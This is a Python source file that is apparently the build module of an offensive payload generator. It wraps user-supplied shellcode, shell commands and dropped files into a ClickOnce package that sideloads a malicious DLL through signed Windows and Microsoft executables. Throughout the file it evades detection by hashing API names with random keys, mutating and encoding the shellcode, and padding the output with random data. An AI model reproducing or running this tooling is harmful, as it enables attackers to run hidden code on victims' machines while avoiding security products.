import os
import re
import traceback
import shutil
import json
import random
import string
from base64 import b64decode, b64encode
from tempfile import TemporaryDirectory
from string import Template
import zipfile
from pathlib import Path

from .models import CFCOPayload
from .logging import PerRequestLogger, GlobalLogger
from .hasher import get_api_hash
from .misc import run_cmd_check_file
from .mutator import Mutator
from .consts import *

class Builder:
    def __init__(self, buildid: str, payload: CFCOPayload):
        """Class responsible for building payloads"""
        self.buildid = buildid
        self.build_dir = os.path.join(BUILD_DIR, buildid)
        self._temp_dir = TemporaryDirectory(delete=False)
        self.temp_dir = self._temp_dir.name
        self.payload = payload
        self.logger = PerRequestLogger(buildid)
        self.tgt_dll = os.path.join(self.temp_dir, "bin", "x64", "Release", f"{self.payload.name}.dll")
        self.sideload_exe = None

    def verify(self):
        """Verify incoming payload"""

        # Check name
        if not re.match(r"^[a-zA-Z_][a-zA-Z0-9_]*$", self.payload.name):
            raise Exception("Application Name does not match provided regex")
        
        # Check inflate size
        if self.payload.inflate > 500 or self.payload.inflate < 0:
            raise Exception("Invalid payload inflation size")
        
        # Check sideload options
        if self.payload.sideload.lower() not in SIDELOAD_OPTIONS:
            raise Exception("Invalid Sideload option provided")
        
        self.logger.debug("Validated all parameters")

    def copy_template_files(self):
        """Copy template files to temporary directory"""
        # Copy source files
        shutil.copytree(SRC_TEMPLATE_DIR, self.temp_dir, dirs_exist_ok=True)
        self.logger.debug("Copied template files from %s to %s", SRC_TEMPLATE_DIR, self.temp_dir)

    def template_files(self):
        """Generate random keys"""

        # Rename project.application 
        os.rename(
            os.path.join(self.temp_dir, "project.csproj"),
            os.path.join(self.temp_dir, f"{self.payload.name}.csproj")
        )

        # Rename project.manifest 
        os.rename(
            os.path.join(self.temp_dir, "project.manifest"),
            os.path.join(self.temp_dir, f"{self.payload.name}.manifest")
        )

        # Rename project.application
        os.rename(
            os.path.join(self.temp_dir, "project.application"),
            os.path.join(self.temp_dir, f"{self.payload.name}.application")
        )

        # First we template the Program.cs
        program_cs = os.path.join(self.temp_dir, "Program.cs")
        with open(program_cs, 'r') as f:
            content = f.read()
            ntdll_key = random.randint(0, 18446744073709551615) & 0x7FFFFFFFFFFFFFFF
            ldrce_key = random.randint(0, 18446744073709551615) & 0x7FFFFFFFFFFFFFFF
            ntdll_hash = get_api_hash("ntdll.dll", ntdll_key)
            ldrce_hash = get_api_hash("LdrCallEnclave", ldrce_key)
            content = content.replace("NTDLL_KEY", hex(ntdll_key)).replace("LDRCE_KEY", hex(ldrce_key))
            content = content.replace("NTDLL_HASH", ntdll_hash).replace("LDRCE_HASH", ldrce_hash)
            content = content.replace("REPLACENAMESPACE", self.payload.name)
            with open(program_cs, 'w') as fw:
                fw.write(content)
                self.logger.debug("Generated NTDLL hash: %s using key: %s", ntdll_hash, hex(ntdll_key))
                self.logger.debug("Generated LdrCallEnclave hash: %s using key: %s", ldrce_hash, hex(ldrce_key))

        # Create Data.cs file
        data_cs_file = os.path.join(self.temp_dir, "Data.cs")
        
        with open(data_cs_file, 'w') as f:
            template_1 = """
                namespace REPLACENAMESPACE
                {
                    internal class Data
                    {

                        private static readonly byte[] data = new byte[]
                        {
                        """.replace("REPLACENAMESPACE", self.payload.name)

            template_2 = """
                        };

                        static unsafe void REPLACEFUNCNAME()
                        {
                            fixed (byte* ptr = data)
                            {
                            }
                        }
                    }
                }""".replace("REPLACEFUNCNAME", ''.join(random.choices(string.ascii_letters, k=16)))
            f.write(template_1)

            # the compiler crashes on greater file sizes, for greater inflations, use a training.data file
            data_cs_size = self.payload.inflate if self.payload.inflate <= DATA_CS_SIZE_IN_MB else DATA_CS_SIZE_IN_MB
            self.logger.debug("Creating Data.cs to inflate payloads by an extra %d MBs", data_cs_size)
            data_cs_size = data_cs_size * 1024 * 1024
            for i in range(int(data_cs_size/32)):
                byte_str = str(list(os.urandom(1*32))).replace("[", "").replace("]", ",\n")
                f.write(byte_str)

            f.write(template_2)
            self.logger.debug("Generated Data.cs with size: %ld", os.stat(data_cs_file).st_size)

            # Create training.data file
            training_data_file = os.path.join(self.temp_dir, "training.data")
            training_data_size = 1 if self.payload.inflate <= DATA_CS_SIZE_IN_MB else (self.payload.inflate - DATA_CS_SIZE_IN_MB)*1024*1024
            with open(training_data_file, 'wb') as f:
                f.write(os.urandom(training_data_size))
                self.logger.debug(f"Created training.data file with size: %ld", training_data_size)

    def compile_artefacts(self):
        """Compile artefacts"""
        
        self.logger.debug("Building artefacts with: %s", BUILD_CMD)
        curr_dir = os.getcwd()
        os.chdir(self.temp_dir)
        run_cmd_check_file(BUILD_CMD, self.tgt_dll, self.logger)
        os.chdir(curr_dir)

    def create_json(self):
        build_json = list()
        for action in self.payload.action:
            a_type = action['type']
            
            # Run shellcode
            if a_type == "run_code":
                b64_encoded = action['file']       
                decoded_payload = list(b64decode(b64_encoded))

                mutator = Mutator(decoded_payload)
                # TODO: Uncomment this
                mutator.inflate = True
                enc_shellcode = b64encode(mutator.generate(self.logger)).decode(encoding='utf-8')
                build_json.append(
                    {
                        "action": 1,
                        "value": enc_shellcode
                    }
                )

            # Run CMD  
            if a_type == "run_cmd":
                build_json.append(
                    {
                        "action": 2,
                        "value": b64encode(action["cmd"].encode()).decode(encoding='utf-8')
                    }
                )

            # Drop file
            if a_type == "drop_file":
                b64_encoded = action['file']
                decoded_payload = list(b64decode(b64_encoded))
                mutator = Mutator(decoded_payload)
                # TODO: Uncomment this
                # mutator.inflate = True
                enc_file = b64encode(mutator.generate(self.logger)).decode(encoding='utf-8')
                
                # Drop location
                enc_filepath = b64encode(action["location"].encode()).decode(encoding='utf-8')

                build_json.append(
                    {
                        "action": 3,
                        "value": [
                            enc_file,
                            enc_filepath
                        ]
                    }
                )

        config_json_file =  os.path.join(self.build_dir, "config.json.deploy")
        with open(config_json_file, 'w') as f:
            json.dump(build_json, f, indent=4)    
            self.logger.info("Created config file at: %s", config_json_file)

    def prepare_files_in_build_dir(self):
        """Put files in build dir, and template them wherever required"""
        
        # Copy sideload exe into build dir
        if (self.payload.sideload.lower() == "tzsync"): 
            self.sideload_exe = TZSYNC
        if (self.payload.sideload.lower() == "perfwatson2"):
            self.sideload_exe = PERFWATSON
        if (self.payload.sideload.lower() == "systemhost"):
            self.sideload_exe = SVCHUB
        if (self.payload.sideload.lower() == "powershell"): 
            self.sideload_exe = POWERSHELL

        shutil.copy(self.sideload_exe.path, self.build_dir)

        # Copy built artefact to build dir
        shutil.copy(self.tgt_dll, os.path.join(self.build_dir, f"{self.payload.name}.dll.deploy"))
        shutil.copy(
            os.path.join(self.temp_dir, "bin", "x64", "Release", "Newtonsoft.Json.dll"),
            os.path.join(self.build_dir, "Newtonsoft.Json.dll.deploy")
        )

        # Create .config file
        with open(os.path.join(SRC_TEMPLATE_DIR, "project.exe.config.deploy"), 'r') as f:
            contents = f.read()
            with open(os.path.join(self.build_dir, f"{self.sideload_exe.exe}.config.deploy"), 'w') as fw:
                fw.write(contents.replace("REPLACEASSEMBLYNAME", self.payload.name))
        
        # prepare .manifest file
        with open(os.path.join(SRC_TEMPLATE_DIR, "project.manifest") , 'r') as f:
            contents = f.read()
            with open(os.path.join(self.build_dir, f"{self.payload.name}.manifest"), 'w') as fw:
                fw.write(
                    Template(contents).safe_substitute(
                        clickonce_name = self.payload.name,
                        dll_size=os.stat(self.tgt_dll).st_size,
                        newtonsoft_dll_size=os.stat(
                            os.path.join(self.build_dir, "Newtonsoft.Json.dll.deploy")
                        ).st_size,
                        config_size = os.stat(
                            os.path.join(self.build_dir, "config.json.deploy")
                        ).st_size,
                        assembly_name = self.sideload_exe.name,
                        assembly_version = self.sideload_exe.version,
                        assembly_key = self.sideload_exe.key,
                        assembly_size = self.sideload_exe.size,
                        assembly_config_size = os.stat(
                            os.path.join(
                                self.build_dir, f"{self.sideload_exe.exe}.config.deploy"
                            )
                        ).st_size
                    )
                ) 

        # prepare .application file
        with open(os.path.join(SRC_TEMPLATE_DIR, "project.application") , 'r') as f:
            contents = f.read()
            with open(os.path.join(self.build_dir, f"{self.payload.name}.application"), 'w') as fw:
                fw.write(
                    Template(contents).safe_substitute(
                        clickonce_name = self.payload.name,
                        manifest_size = os.stat(
                            os.path.join(self.build_dir, f"{self.payload.name}.manifest")
                        ).st_size
                    )
                ) 

    def zip_file(self):
        target_extensions = ('.deploy', '.manifest', '.application')
        source_path = Path(self.build_dir)

        matching_files = []
        for ext in target_extensions:
            matching_files.extend(source_path.glob(f'**/*{ext}'))

        if not matching_files:
            raise Exception("No files to zip found")
        
        output_zip = os.path.join(self.build_dir, f"{self.payload.name}.zip")
        zip_path = Path(output_zip)
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file_path in matching_files:
                if file_path.is_file():  # Ensure it's a file, not a directory
                    # Add file to zip, preserving relative path structure
                    relative_path = file_path.relative_to(source_path)
                    zipf.write(file_path, relative_path)
                    os.remove(file_path)
                    self.logger.debug(f"Added: {relative_path}")

        self.logger.info(f"Successfully created '{output_zip}' with {len(matching_files)} files")

def build_func(buildid: str, inc_req: CFCOPayload):
    """Build the payload"""
    try:
        # Create handler class
        builder = Builder(buildid, inc_req)

        builder.logger.debug(f"{inc_req}")

        # Copy template files to build dir
        if not os.path.exists(SRC_TEMPLATE_DIR):
            builder.logger.error("Source Template Directory %s not found", SRC_TEMPLATE_DIR)
            raise FileNotFoundError("Source Template Directory %s not found", SRC_TEMPLATE_DIR)
        
        # Verify incoming payload parameters 
        builder.verify()

        # Copy template files to temp directory
        builder.copy_template_files()

        # Template files
        builder.template_files()

        # Build payload DLL
        builder.compile_artefacts()

        # Create json file
        builder.create_json()

        # Put files in build dir
        builder.prepare_files_in_build_dir()

        # Zip files
        builder.zip_file()

    except Exception as e:
        GlobalLogger.error("Exception occured as %s", e)
        GlobalLogger.error("Traceback: %s", traceback.format_exc())
